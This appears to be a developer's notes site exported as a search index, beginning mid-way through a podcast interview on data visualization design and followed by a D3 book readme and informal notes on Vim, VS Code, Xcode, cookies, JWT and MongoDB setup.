just tried to curve these little lines and I ended up ditching that because it just looked sort of like a weird creepy spider and stuff instead of like a hurricane. So, visually it just wasn't working that well. And also, you know, like curved things are definitely harder to read. So I was hoping in my mind that it would look cool enough that it wouldn't matter, but it turned out that it was just harder to read and weird looking. So yeah, and then it evolved a lot. It started out pretty bare bones with just data on the amount of damage and the deaths. And it was kind of like just that line with a bubble on the end. and then from there I was like... \"Okay, this needs like some more stuff.\" Cause it looks kinda sparse. and so then I got the idea of adding the category information with those little diamonds. and then I realized it's kind of losing the connection to the idea of naming. And so that was when I added the little inner circle with all the diamonds that has like all the previous uses of that name.</p> <p>Amelia: [00:17:58]</p> <p>It seems pretty straightforward, as far as the data viz projects go. I feel like I always start with sketching. I don't know if you sketch a lot, but then you can't sketch a lot, because it's data, right. And it's really gonna depend on, like, is it going to look like a spider? I'm not gonna know from scratch.</p> <p>Will: [00:18:20]</p> <p>Yeah, exactly. I think I did start sketching initially and my sketches always look very childish and bad because I'm not very good at sketching. But... it was definitely one of those situations where once I got the data in there, it was like, yeah, that doesn't work. Yes. I do highly recommend that everybody starts with sketching. I still sketch, even if I'm bad at it. And it, even if I know it's going to change when the data hits it, I still think it's definitely worthwhile to like sit down at the beginning and just sketch because, more as like an exploration. So it helps you to kind of explore without having to worry about like coding it or getting bogged down with a bug. so it's definitely something where you can just experiment with tons of different visual forms really quickly to try to sort of figure out what works best.</p> <p>Amelia: [00:19:15]</p> <p>Yeah. I love that. I find that if I code something right away, I'm going to do it in the easiest way possible. So it's going to follow whatever is easiest, you know, with SVG or with HTML. And that's not really going to lead to the best result.</p> <p>Will: [00:19:34]</p> <p>Yeah. And I mean, I definitely take that approach too. And I usually do... I think I mentioned this when I started this one on Observable, I usually do that where if I'm working with something, especially if it's something kind of big where there's a lot of custom components like this one had a lot of, you know, custom SVG components. Those diamonds were a real pain to figure out like all the math. So it's a lot of trigonometry and stuff. I do find it really nice now to have Observable to just focus on let's figure out how to make this one component. and then let's sort of make the basic visual forms. And then once I get it to the point where I'm like, \"Okay, I've checked off the things that I think are kind of tricky, little guess and check things to figure out\", then I move it over to a real project.</p> <p>Amelia: [00:20:17]</p> <p>Yeah. That makes a lot of sense. It's nice to focus in on certain parts and then put them together as opposed to like, \"Okay, we're going to start at the top.\"</p> <p>Will: [00:20:26]</p> <p>Yeah. It can also be, you know, like a little intimidating, or even just annoying when you're like excited to get right into code, but you have to do all the like setup work to get your project started and the scaffolding and everything. Yeah.</p> <p>Amelia: [00:20:37]</p> <p>Yeah.  Is there anything that you think would be really useful for someone who's just getting started with doing data viz? Is there anything that maybe you got really stuck on, that you wish someone had told you?</p> <p>Will: [00:20:53]</p> <p>I think getting a little bit stuck. So, there's sort of this balance. In the beginning, when you're trying something, it's useful to have rules. And so if you look at books or blog posts and stuff that talk about best practices and data visualization, you know, it'll often give you certain sets of rules. Nowadays people use things like don't use pie charts, right? And people will spout that, but, I think when you're starting out, it's important to realize that the rules are there for a reason, but the reason is usually to prevent bad usage of something. But it doesn't necessarily mean that a particular thing is always terrible. So, you know, pie charts are a good example where people say don't use pie charts because they're often misused. But as you level up in data visualization and you get to know more and more, you'll realize that there's plenty of situations in which pie charts are perfectly fine and they might even be the best choice. But people often carry those rules through as if they were some sort of dogma that, you know, is  always to be obeyed. And so, you know, you see a pie chart and you like start throwing tomatoes at your computer or something. Cause, it's like, \"How dare you? You should never use a pie chart!\" So I would say... recognize that rules are useful for giving you guidelines, but that you should always keep an open mind to other ways to visualize things, how things can be used better, or try to think of a better way to do things. So, you know, if people say \"Don't use a pie chart\", then think about, well, how would I make a pie chart work? Well, rather than just saying, you know, never use it. Which is sort of what I did with that hurricanes project. I took the idea of like a radial chart, which I said, doesn't really work on the web, or I've never seen one that really worked well on the web. And instead of saying, \"Okay, I'm just going to make it a poster\" or \"I'll just do it in print\", I thought, how could I do it that it would work for the web? Yeah, I love that. It's almost like follow the rules until you understand why they're there, and then break them.</p> <p>Amelia: [00:23:06]</p> <p>And then the other thing I wanted to ask you about is... wHat makes a good data visualization? I know we just talked about how rules are bad, but are there any rules of thumb that you use when creating new data viz, for deciding whether it's gonna work or not work?</p> <p>Will: [00:23:40]</p> <p>Yeah, that's a really difficult question because I think it's very specific to the project. So I would say, one thing that I always try to keep in mind is who's the audience for this and what's the purpose of this. For example, if I'm building a chart at Fidelity and you know, the audience for this is a business analyst or maybe one of the like squad managers that works on one of our financial products, and the purpose of the chart is just to communicate to them like how well their product is doing this month, or, you know, which products are underperforming or something. Then I'm going to go for a chart and a style that's optimized for ease of comprehension. You know, I'm going to go with something relatively simple, like a bar chart or a line chart, or some kind of, you know, something that's not too crazy and complicated. Ahd I'm going to go for a visual style. That's fairly paired back minimalistic that really like focuses on the data and aids the speed of comprehension. On the other hand, if I'm designing something for, you know, journalistic type project for a newspaper where the audience is, maybe a general audience made up of people like, you know, my parents, my friends, like anybody on the street, and you're trying to convince them of something or make something that's going to make an impression on them. Then I might go the opposite direction and go for something that's more artistic. You know, something that is not necessarily going to be super easy to read, but might actually demand that somebody sit down and take some time to invest, to really pick apart, you know, different parts of the visualization. It might be a totally custom visualization that's not a chart anyone's ever seen before and people might have to sit down and really read through it. The visual design might be more complex, you know, there might be more stylized elements. It might have more emphasis on, you know, colors and typography and layout that are used to evoke a certain feeling or a certain emotion, rather than just visual clarity. I would say... when you sit down to make something don't always go for, you know, what's the best chart to make this, or, you know, what's the easiest thing to read, but think about who's your audience and then design the chart for them person, or group of people.</p> <p>Amelia: [00:26:19]</p> <p>I love that so much. That's one of my big things too. And I came from a kind of scientific academic background, like you, and I don't know if you've had this, but I've had to... like when I learned data visualization, I learned like, \"Oh, well, our perceptual system is best at, you know, judging whether lines are longer than each other.\" And then I got thrown into doing like marketing data viz, which...they don't care if you can tell which bar is longer within half a second. Totally different things are going to work for these two different projects.</p> <p>Will: [00:26:55]</p> <p>Right. And that's a good point actually, is that, you know, a common criticism I'll see sometimes of especially charts that are more out there, like less, you know, less conventional charts is, \"Oh, well, this chart isn't very accurate.\" You know, you couldn't look at this and tell. What is the number that this symbol represents. But, you know, the truth is that's really, that's usually not the point of a chart. If you want to know what are the exact numbers, just give someone a table, give them a spreadsheet. That's the point of a spreadsheet. The point of a chart is to give an overall graphical representation so that you can look at it and make comparisons between groups, you know, easily analyze things like relationships between. individuals, get an overall graphical perception, get a sense of scale. You know, those are the things that you use a graph for, not... \"What is this exact number?\"</p> <p>Amelia: [00:27:47]</p> <p>Yup. A hundred percent agree. I think this was so great. I, especially like to your messages of, you know, really know your audience, sketching is very freeing for your ideas, and learning in public. Is there anything else you want to talk about?</p> <p>Will: [00:28:11]</p> <p>Nope, I think that's it. If people like this, they can check out my website. I do post, so that's where I post most of my educational stuff. All my blogs and stuff is on there, and you'll find links to my newsletter, which you can follow, my Twitch, where I do streaming and stuff like that. YEah. And I'm always available. So if people have questions, feel free to reach out, feel free to email me, DM on Twitter. I'm always happy to help.</p> <p>Amelia: [00:28:39]</p> <p>Awesome. Thanks so much. Yeah. Thank you.</p>"},{"location":"datav/codes/code/fullstack-d3-advanced-code/","title":"Fullstack D3 and Data Visualization","text":"<p>This is the full code that goes along with Fullstack D3 and Data Visualization. We're so excited that you're interested in learning d3.js and data visualization with us!</p> <p>To run these examples, either read the Introduction and the first chapter of the book, or follow the instructions below.</p>"},{"location":"datav/codes/code/fullstack-d3-advanced-code/#getting-started","title":"Getting Started","text":"<p>You'll need a static file server to circumvent CORS limitations. Here are two options that will work -- feel free to use either, or another one that you're comfortable with.</p> <p>a. node.js</p> <p>I would recommend using this method because it has live reload built in, meaning that our page will update when we save our changes. No page refresh necessary!</p> <p>If you don't have node.js installed, take a minute to install it (instructions here). You can check whether or not node.js is already installed by using the <code>node -v</code> command in your terminal \u2014 if it responds with a version number, you're good to go! node.js should also come with npm, which is short for Node Package Manager</p> <p>Once node.js and npm are installed, run the following command in your terminal.</p> <pre><code>npm install -g live-server\n</code></pre> <p>This will install live-server, a simple static server that has live reload built-in. To start your server, run <code>live-server</code> in the root <code>/code</code> folder and it will even open a new browser window for you.</p> <p>b. python</p> <p>If you have\u00a0python\u00a0(version 3) installed already, you can use the Python 3 http server instead. Start it up in the root <code>/code</code> folder with by running the command\u00a0<code>python -m http.server 8080</code> in your terminal.</p> <p>The particular server doesn't matter \u2014 the key idea is that if you want to load a file from JavaScript, you need to do it from a webserver, and these tools are an easy solution for a development environment. Make sure that you are in the root <code>/code</code> folder when you start either server.</p> <p>Now we should have a server on port 8080. Load localhost:8080 in your web browser and you'll see a directory of code for each chapter, which looks something like this:</p> <p></p> <p>Click through the folders to find the example you're working on.</p> <p>For all of our code examples, there will be a finished version in a sibling <code>/completed</code> folder.</p>"},{"location":"datav/codes/code/fullstack-d3-advanced-code/#getting-help","title":"Getting help","text":"<p>The code in this book has been vigorously tested to ensure that it works in all modern environments. But if you run into any part that is confusing, or if you get stuck anywhere, please reach out!</p> <p>Send an email to us@fullstack.io detailing the issue and we'll get back to you as soon as possible.</p>"},{"location":"datav/codes/code/fullstack-d3-advanced-code/#license","title":"License","text":"<p>This project is licensed under the MIT License - see the LICENSE.md file for details</p>"},{"location":"datav/codes/code/fullstack-d3-advanced-code/LICENSE/","title":"LICENSE","text":"<p>MIT License</p> <p>Copyright \u00a9 2019 Fullstack D3 and Data Visualization</p> <p>Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the \"Software\"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:</p> <p>The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.</p> <p>THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.</p>"},{"location":"datav/codes/code/fullstack-d3-advanced-code/14-using-d3-with-angular/","title":"Index","text":"<p>Run <code>ng serve</code> for a dev server. Navigate to <code>http://localhost:4200/</code>. The app will automatically reload if you change any of the source files.</p>"},{"location":"devtools/","title":"Index","text":""},{"location":"devtools/#get-ip-address","title":"get ip address","text":"<p>For private/internal ipv4 address</p> <p>For Wi-Fi, enter <code>ipconfig getifaddr en0</code> and your local IP will appear.</p> <p>For wired connections, enter <code>ipconfig getifaddr en1</code> into the Terminal and your local IP will appear</p> <p>For external/public ipv4 address <code>dig +short txt ch whoami.cloudflare @1.0.0.1</code></p>"},{"location":"devtools/#get-formatted-current-day","title":"get formatted current day","text":"<pre><code>const today = new Date().toLocaleDateString(\"en-US\", {\n  weekday: \"long\",\n  year: \"numeric\",\n  month: \"long\",\n  day: \"2-digit\",\n});\nconsole.log(today);\n</code></pre> <p>all options <pre><code>{\n  weekday: 'narrow' | 'short' | 'long',\n  era: 'narrow' | 'short' | 'long',\n  year: 'numeric' | '2-digit',\n  month: 'numeric' | '2-digit' | 'narrow' | 'short' | 'long',\n  day: 'numeric' | '2-digit',\n  hour: 'numeric' | '2-digit',\n  minute: 'numeric' | '2-digit',\n  second: 'numeric' | '2-digit',\n  timeZoneName: 'shortOffset' | 'shortGeneric' | 'longOffset' | 'longGeneric',\n  // Time zone to express it in\n  timeZone: 'Asia/Shanghai',\n  // Force 12-hour or 24-hour\n  hour12: true | false,\n\n  // Rarely-used options\n  hourCycle: 'h11' | 'h12' | 'h23' | 'h24',\n  formatMatcher: 'basic' | 'best fit'\n}\n</code></pre></p> <pre><code>console.log(\n  new Intl.DateTimeFormat(\"en-US\", {\n    weekday: \"long\",\n    year: \"numeric\",\n    month: \"short\",\n    day: \"2-digit\",\n    timeZone: \"Asia/Shanghai\",\n    timeZoneName: \"shortOffset\",\n  }).format(new Date())\n);\n</code></pre>"},{"location":"devtools/#color-system","title":"color system","text":"<pre><code>:root {\n\n  --yellow: #fad956;\n}\n</code></pre>"},{"location":"devtools/browser/","title":"Browser","text":"<p><code>about:blank</code>: starting a browsing session <code>about:about</code> <code>about:downloads</code> <code>about:settings</code></p> <pre><code>class Automation {\n  constructor() {\n    this.tablle = new Map({\n      [\"start\", [\"start\",]]\n    })\n  }\n}\n</code></pre>"},{"location":"devtools/cli/","title":"Cli","text":"<p><code>ctrl+u</code>: delete till start of line <code>ctrl+k</code>: delete to the end of line <code>ctrl+a</code>: move cursor to the beginning of line <code>ctrl+e</code>: move cursor to the end of line <code>alt+e</code>: move one word forward <code>alt+b</code>: move one word back</p>"},{"location":"devtools/markdown/","title":"Markdown","text":""},{"location":"devtools/markdown/#third-party-embed","title":"third-party embed","text":"<ul> <li> embbed pdf best practice</li> </ul> <p>see more about pdf open parameter</p> <pre><code>&lt;object data=\"/blog/images/xxx.pdf\" type=\"application/pdf\" width=\"100%\"&gt;\n&lt;/object&gt;\n</code></pre> <ul> <li> embed code sanbox best practice</li> </ul> <p>If you ever used Codepen, JSFiddle, or CodeSandbox you\u2019re familiar with what a code sandbox is.</p> <pre><code>&lt;div spellcheck=\"false\" autocorrect=\"off\" autocapitalize=\"off\" translate=\"no\" contenteditable=\"true\" class=\"cm-content\" style=\"tab-size: 4;\" role=\"textbox\" aria-multiline=\"true\" data-language=\"javascript\" data-gramm=\"false\" data-lt-active=\"false\" aria-label=\"Code Editor for App.js\" tabindex=\"-1\"&gt;\n</code></pre> <ol> <li> <p>Support both language and diff highlighting #5758 \u21a9</p> </li> </ol>"},{"location":"devtools/shell/","title":"Shell","text":""},{"location":"devtools/shell/#shell-config","title":"shell config","text":"<p>There are five startup files that zsh will read commands from:</p> <pre><code>$ZDOTDIR/.zshenv\n$ZDOTDIR/.zprofile\n$ZDOTDIR/.zshrc\n$ZDOTDIR/.zlogin\n$ZDOTDIR/.zlogout\n</code></pre>"},{"location":"devtools/vim/","title":"Vim","text":"<p>gg - goes to the begin of the document G - navigates at its very end d - delete mode <code>d^</code>: delete to the start of line <code>cw</code>: change from cursor to end of word and enter insert mode <code>:.,$d</code>: delete from current line to end of the file <code>diw</code>: delete (cut) word under the cursor <code>daw</code>: delete (cut) word under the cursor and the space after or before it <code>dd</code>: delte the whole lines <code>V, expnad or shrink the line selection, and press d</code>: select and delete <code>opt + shift + cursor under line</code>: multi line selection</p> <p>``` copy/delete word under cursor in Vim yw / byw</p> <p>Assuming that the cursor is at the first character of the word simply do this in command mode:      yw y is for yank and w is for word.</p> <p>Other ways of doing the same thing which are not as efficient:      vey the v starts visual select mode. e tells vim to move to end of word. y yanks or copies the word. to delete replace y with x.</p> <p>if the cursor is somewhere in the middle of the word, add a b before the command as in:      byw or      bvey</p> <p>the v starts visual select mode. e tells vim to move to end of word(<code>b</code> tells vim to move to start of word). y yanks or copies the word. to delete replace y with x. ``</p> <p><code>viw</code> does a visual select inside the word. <code>bve</code> to select the word under cursor Be aware though that if the cursor points to a first character you just need <code>ve</code> combination</p> <p>yaw to yank the entire word regardless of where the cursor is located.</p> <p>type <code>cs('</code> to [c]hange [s]urroundings from ( to ' <code>ds(</code> to [d]elete  [s]urroundings <code>{</code> altogether</p> <p>c deletes the selection and enters insert mode () types the opening and closing parentheses  exits insert mode P pastes the previously deleted text inside the parentheses <p>1.Press v to begin character-based visual selection, or V to select whole lines, 2. Press d (delete) to cut, or y (yank) to copy. 3. Press p to paste after the cursor, or P to paste before.</p> <ol> <li> <p>wrap.dev Vim  \u21a9</p> </li> </ol>"},{"location":"devtools/vscode/","title":"Vscode","text":"<ul> <li> show all commands</li> </ul> <pre><code>{\n  \"key\": \"f1\",\n  \"command\": \"workbench.action.showCommands\"\n}\n</code></pre> <ul> <li> jump to specific line <code>Ctrl + g</code></li> <li> create new file</li> </ul> <pre><code>{\n  \"key\": \"shift+alt+n\",\n  \"command\": \"welcome.showNewFileEntries\"\n}\n</code></pre> <ul> <li> <p> shell command: install 'code' command in PATH</p> </li> <li> <p> trigger suggest</p> </li> </ul> <pre><code>{\n  \"key\": \"cmd+i\", // ctrl + space2\n  \"command\": \"editor.action.triggerSuggest\",\n  \"when\": \"editorHasCompletionItemProvider &amp;&amp; textInputFocus &amp;&amp; !editorReadonly &amp;&amp; !suggestWidgetVisible\"\n}\n</code></pre> <ul> <li> trigger parameter hint </li> </ul> <pre><code>{\n  \"key\": \"shift+cmd+space\",\n  \"command\": \"editor.action.triggerParameterHints\",\n  \"when\": \"editorHasSignatureHelpProvider &amp;&amp; editorTextFocus\"\n}\n</code></pre> <ul> <li> close parameter hint</li> </ul> <pre><code>{\n  \"key\": \"escape\",\n  \"command\": \"closeParameterHints\",\n  \"when\": \"editorFocus &amp;&amp; parameterHintsVisible\"\n}\n</code></pre> <ul> <li> find and replace</li> </ul> <pre><code>{\n  \"key\": \"alt+cmd+f\",\n  \"command\": \"editor.action.startFindReplaceAction\",\n  \"when\": \"editorFocus || editorIsOpen\"\n}\n</code></pre> <ul> <li> toggle panel visibility</li> </ul> <pre><code>{\n  \"key\": \"cmd+j\",\n  \"command\": \"workbench.action.togglePanel\"\n}\n</code></pre> <ul> <li> rename symbol</li> </ul> <pre><code>{\n  \"key\": \"f2\",\n  \"command\": \"editor.action.rename\",\n  \"when\": \"editorHasRenameProvider &amp;&amp; editorTextFocus &amp;&amp; !editorReadonly\"\n}\n</code></pre> <ul> <li> shrink selection</li> </ul> <pre><code>{\n  \"key\": \"ctrl+shift+left\",\n  \"command\": \"editor.action.smartSelect.shrink\",\n  \"when\": \"editorTextFocus\"\n}\n</code></pre> <ul> <li> expand selection</li> </ul> <pre><code>{\n  \"key\": \"ctrl+shift+right\",\n  \"command\": \"editor.action.smartSelect.expand\",\n  \"when\": \"editorTextFocus\"\n}\n</code></pre> <ul> <li> show quick fix</li> </ul> <pre><code>{\n  \"key\": \"cmd+.\",\n  \"command\": \"editor.action.quickFix\",\n  \"when\": \"editorHasCodeActionsProvider &amp;&amp; textInputFocus &amp;&amp; !editorReadonly\"\n}\n</code></pre>"},{"location":"devtools/vscode/#config-user-snippet","title":"config user snippet","text":"<p>exhaustively check \uff08\u7a77\u5c3d\u68c0\u67e5\uff09</p> <ul> <li> font family</li> </ul> <pre><code>  \"editor.fontFamily\": \"Fira Code, jetBrains Mono\",\n  \"terminal.integrated.fontFamily\": \"Fira Code, jetBrains Mono, monospace\",\n  \"editor.fontLigatures\": true,\n  \"editor.fontWeight\": \"500\", // Retina\n  \"editor.fontSize\": 16, \n</code></pre> <p></p>"},{"location":"devtools/xcode/","title":"Xcode","text":"<p>Listing all available simulators</p> <pre><code>xcrun simctl list\n</code></pre> <p>create and boot simutlators</p> <pre><code>xcrun simctl create &lt;uuid&gt;\nxcrun simctl boot &lt;uuid&gt;\n</code></pre> <p>shutdown and erase simulators</p> <p>Install or Uninstall app inside Simulator</p> <p>Launch or Terminator app inside Simulator</p> <pre><code>xcrun simctl launch booted &lt;app&gt;\nxcrun simctl terminate booted &lt;app&gt;\n</code></pre>"},{"location":"flutter/","title":"\u642d\u5efa\u5f00\u53d1fluter\u5e94\u7528\u7684\u5f00\u53d1\u548c\u8c03\u8bd5\u73af\u5883","text":"<p>dev &amp; debug env for devloping flutter app on macos</p> <p>to run and test flutter app on emulator device</p> <p>run and test flutter app on android device</p>"},{"location":"flutter/class/","title":"Class","text":"<ul> <li>mixins</li> <li>extension</li> </ul> <pre><code>class User {\n\n  String? _email;\n\n\n  User({\n    required String email,\n  }) {\n    this.email = email\n  }\n\n    set email (String value) {\n    if (value.contains('@')) {\n      _email = value\n    } else {\n      _email = null\n    }\n  }\n}\n</code></pre>"},{"location":"flutter/collection/","title":"Collection","text":"<ul> <li>list</li> <li>map</li> <li>set</li> <li>collection transformation</li> </ul>"},{"location":"flutter/function/","title":"Function","text":"<ul> <li>params signature(type and num)</li> <li>poistion params</li> <li>named params</li> <li>optional params with default</li> <li>requried params </li> </ul>"},{"location":"node/","title":"Index","text":"<p>test</p>"},{"location":"node/cookie/","title":"Cookie","text":""},{"location":"node/cookie/#localstorage-sessionstorage","title":"localstorage \u548c sessionstorage \u7684\u4f7f\u7528\u5e38\u89c1\u5206\u522b\u662f\u4ec0\u4e48","text":"<p>vuex,redux,zustand,mobx\u7b49\u72b6\u6001\u7ba1\u7406\u5de5\u5177\uff0c\u5c06\u6570\u636e\u5b58\u5728\u5185\u5b58\u4e2d \u672c\u5730\u5b58\u50a8\uff1alocalstorage\uff0csessionstorage\uff0c\u4e0d\u4f1a\u5728\u670d\u52a1\u5668\u8bbe\u7f6e sessionstorage \u5217\u8868\u9875</p>"},{"location":"node/cookie/#cookiesession","title":"cookie\u548csession\u7684\u4f7f\u7528\u573a\u666f\u5206\u522b\u662f\u4ec0\u4e48,\u89e3\u51b3\u7684\u95ee\u9898","text":"<p>\u670d\u52a1\u7aef\u8bbe\u7f6e \u4ec5\u653e\u5728\u670d\u52a1\u7aef\u7ef4\u62a4\uff0c\u4e0d\u66b4\u9732\u7ed9\u5ba2\u6237\u7aef,\u4e0b\u53d1\u7528\u6237\u552f\u4e00\u6807\u8bc6\u5230\u5ba2\u6237\u7aef</p>"},{"location":"node/cookie/#jwt","title":"jwt","text":""},{"location":"node/cookie/#status-code","title":"status code","text":"<p>405 Method Not Allowed</p> <p>404 Not Found</p>"},{"location":"node/cookie/#what-data-is-collected","title":"What Data Is Collected","text":"<ul> <li>Authentication and security</li> <li> <p>site service and feature</p> </li> <li> <p>site security cookie IP address/ OS version&amp;type / Device Type / brower type / name of ISP</p> </li> <li> <p>analytics cookies The pages which you have accessed. The length of your session. The date and time of your visit to the website. The number of times you access our website within any month. The website which referred you to our website. The domain name you requested.</p> </li> <li> <p> perfromance cookie</p> </li> <li> <p> Advertising/targeting cookies   \u9650\u5236\u60a8\u770b\u5230\u5e7f\u544a\u7684\u6b21\u6570\uff0c\u8ba9\u60a8\u4e0d\u4f1a\u53cd\u590d\u770b\u5230\u540c\u4e00\u6761\u5e7f\u544a   \u8d2d\u4e70\u8fc7\u5176\u5546\u54c1\u6216\u4f7f\u7528\u8fc7\u5176\u5e94\u7528\u7684\u7528\u6237\u6295\u653e\u5e7f\u544a   '_fbp'\u770b\u5230\u5e7f\u544a\u540e\u8d2d\u7269\u7684\u9891\u7387   \"oo\" \u5728\u7b2c\u4e09\u65b9\u7f51\u7ad9\u4e0a\u7684\u52a8\u6001\u5411\u60a8\u5c55\u793a\u5e7f\u544a</p> </li> <li> <p> Preferences cookies Save and honor your preferences (such as your theme, language or the region you are in or choose) and provide more enhanced, personal features.</p> </li> </ul> <p></p> <pre><code>ctx.res.setHeader(\"Set-Cookie\", [\n  // \u2018AEC\u2019 cookies ensure that requests within a browsing session are made by the user, and not by other sites. These cookies prevent malicious sites from acting on behalf of a user without that user\u2019s knowledge\n  \"AEC=AVYB7crR8cCxeGkhRIfu; domain=.google.com\",\n  // cloudflar bot management\n  \"__cf_bm; expires=1h\"\uff0c\n  // perf cookie: Google Cloud Load Balancer\n  \"GCLB=\",\n    // \u201cdatr\u201d \u662f\u60a8\u6d4f\u89c8\u5668\u7684\u552f\u4e00\u8bc6\u522b\u7b26, \u53ef\u5e2e\u52a9\u6211\u4eec\u8bc6\u522b\u60a8\u4ee5\u524d\u767b\u5f55\u8fc7\u4e14\u53ef\u4fe1\u8d56\u7684\u6d4f\u89c8\u5668\n    \"datr=9NNLZJsF5TCTxhpfl-wlPB8o; max-age=3\"\uff0c\n    // \u7edf\u8ba1\u5e7f\u544a\u7684\u5c55\u793a\u6b21\u6570\u548c\u770b\u5230\u5e7f\u544a\u540e\u8d2d\u7269\u7684\u9891\u7387\n    \"_fbp=9NNLZJsF5TCTxhpfl-wlPB8o; httpOnly\"\n    // \u5c4f\u5e55\u548c\u7a97\u53e3\u7684\u6bd4\u7387\u548c\u5c3a\u5bf8\n    \"dpr\"\n])\n</code></pre>"},{"location":"node/cookie/#cookie","title":"cookie\u8bfb\u5199\u4e2d\u95f4\u4ef6\uff08\u5b9e\u7528\u65b9\u6cd5\uff09","text":"<pre><code>const crypto = require('crypto')\n\nconst sign = (val, secret) =&gt; {\n  return crypto.createHmac('sha256', secret).update(val).digest('base64url')\n  // '/' -&gt; '_'; = -&gt; ''\n}\n\napp.use((ctx,next) =&gt; {\n  ctx.res.setCookies = (key, value, option) =&gt; {\n    const opt = option || {}\n    let val = encodeURIComponent(value)\n    // \u9632\u6b62\u5ba2\u6237\u7aef\u7be1\u6539\u7684\u7b7e\u540d\n    if(opt.signed) {\n      val = sign(val, 'xiyuan')\n    }\n    const pairs = [key + \"=\" + val]\n\n\n\n\n    if(opt.domain) {\n      pairs.push('Domain=' + opt.domain )\n    }\n    if (opt.path) {\n      paris.push(\"Path=\" + opt.path)\n    }\n    if (opt.MaxAge) {//\u4ee5s\u4e3a\u5355\u4f4d\n      paris.push(\"Max-Age=\"+ opt.MaxAge)\n    }\n\n    return pairs.join(\"; \")\n  }\n})\n\n\nctx.res.setHeader(\"Set-Cookie\", )\n</code></pre>"},{"location":"node/jwt/","title":"Building the Internet's missing identity layer","text":"<p>WebAuthn and FIDO 2 - enabling passwordless login OpenID Connect JSON Web Token (JWT) and its underpinnings OAuth 2.0 specifications OpenID Certification Program - enabling an interoperable identity ecosystem</p> <p>OpenID Connect OAuth 2.0 JSON Web Token (JWT) Identity Federations Passwordless Login</p> <p>\u8ba4\u8bc1: who you are \u6388\u6743: what you can do   - \u57fa\u4e8e\u8d44\u6e90\u63a7\u5236ACL   - \u57fa\u4e8e\u89d2\u8272\u63a7\u5236RBAC <pre><code>select per_desc, per_url\nfrom permisson\nwhere id IN (\n  select per_id\n  from role_perm\n  where role_id IN (\n    select role_id\n    from user_role\n    where user_id = 1\n  )\n)\n</code></pre> \u6743\u9650\uff1aaccessbleAPI</p>"},{"location":"node/jwt/#_1","title":"\u8d26\u53f7\u8ba4\u8bc1","text":"<p>\u624b\u673a\u53f7\u3001\u90ae\u7bb1 \u5b66\u53f7\u3001\u5de5\u53f7\u3001\u8eab\u4efd\u8bc1\u53f7</p>"},{"location":"node/jwt/#_2","title":"\u7b2c\u4e09\u65b9\u8ba4\u8bc1","text":"<p>3-party Social Connections</p> <p>\u7b2c\u4e09\u65b9\u767b\u5f55 \u5355\u70b9\u767b\u5f55</p> <p>JSON WEB TOKENS in Detail <pre><code>const encodedHeader = base64(JSON.stringify(header))\nconst encodedPayload = base64(JSON.stringify(header))\nconst signature = base64(hmac([encodedHeader,encodedPayload].join('.'),secret, sha256))\nconst jwt = [encodedHeader,encodedPayload,signature].join('.')\n</code></pre> <pre><code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9. &lt;- header\neyJpdGVtcyI6WzAsMiw0XSwiaWF0IjoxNDkzMTM5NjU5LCJleHAiOjE0OTMxNDMyNTl9. &lt;-playload\n932ZxtZzy1qhLXs932hd04J58Ihbg5_g_rIrj-Z16Ja &lt;- signature\n</code></pre></p> <pre><code>// prefixed by /protected\napp.use('/protected', expressJwt({\n  secret:\n  audience: process.enve.AUTHO_API_ISSUER\n  issuer: process.env.AUTHO_API_ISSUER\n  requestProperty:\n  getToken: req =&gt; {\n    return req.cookies['access_token']\n}\n}))\n\n// validate the access (authorization) to the API\n// validate the integrity of the client side data\n</code></pre> <p>JSON Web Signatures</p> <p>JSON Web Encryption</p> <p>JSON Web Keys</p> <p>JSON Web Algorithm</p>"},{"location":"node/mongodb/","title":"Mongodb","text":""},{"location":"node/mongodb/#_1","title":"\u5b89\u88c5","text":"<p>Home Resources &gt; Server Document#Installation &gt; Community Edition docs &gt; Database Manual</p> <p>\u901a\u8fc7\u5305\u7ba1\u7406\u5de5\u5177\u5b89\u88c5 <pre><code># beer taps(beer-related term)\n# brew tap: makes a clone of the repository at &lt;user&gt;/&lt;repo&gt; https://github.com/&lt;user&gt;/homebrew-&lt;repo&gt;\nbrew tap mongodb/brew\n# update Homebrew and all existing formulae(\u914d\u65b9)\nbrew update\n#  specify the version when install mongodb\nbrew install mongodb-community@7.0\n</code></pre> \u901a\u8fc7docker\u5b89\u88c5</p> <p>The installation includes the following executables:   The <code>mongod</code> server : <code>/urs/local/bin/mongod</code>   The <code>mongos</code> sharded cluster query router: /urs/local/bin/mongos   The MongoDB Shell, <code>mongosh</code>: <code>/urs/local/bin/mongosh</code></p>"},{"location":"node/mongodb/#sys-vars-config","title":"\u670d\u52a1\u7cfb\u7edf\u53d8\u91cf\u914d\u7f6e(sys-vars-config)\u542f\u52a8","text":"<p>\u5e38\u89c1\u914d\u7f6e\u6587\u4ef6\u540d .ini(initiative-\u521d\u59cb\u5316) config(~/.ssh) tsconfig.json redis.conf(yml) .eslintrc, .prettierrc (runtime config \u8fd0\u884c\u65f6\u914d\u7f6e)</p> <p>fix brew services <code>brew untap homebrew/services</code> <code>brew tap homebrew/services</code> <code>brew services</code> <pre><code>\u279c brew services list\nName              Status  User File\nmongodb-community none\n#  start the mongod process as a macOS service\n\u279c brew services start mongodb-community\n# To stop a mongod running as a macOS service\nbrew services stop mongodb-community\n# Connect and Use MongoDB\nmongosh\n</code></pre></p> <p>\u914d\u7f6e\u9879 | \u53c2\u6570(flag)      | \u542b\u4e49                             | | :-------- | :------------------------------- | | --dbpath  | \u6307\u5b9a\u6570\u636e\u5e93\u6587\u4ef6\u7684\u76ee\u5f55             | | --port    | \u7aef\u53e3 \u9ed8\u8ba4\u662f27017 28017           | | --fork    | 